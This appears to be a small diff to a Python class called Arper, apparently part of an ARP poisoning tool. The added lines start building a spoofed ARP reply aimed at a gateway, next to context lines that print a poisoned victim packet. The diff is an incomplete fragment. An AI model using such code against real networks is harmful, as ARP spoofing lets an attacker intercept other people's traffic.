@@ -46,5 +46,12 @@ class Arper():
         print(f'mac src: {poison_victim.hwsrc}')
         print(poison_victim.summary())
         print('_'*30)
+        poison_gateway = ARP()
+        poison_gateway.op = 2
+        
+
+
+
+
 
 
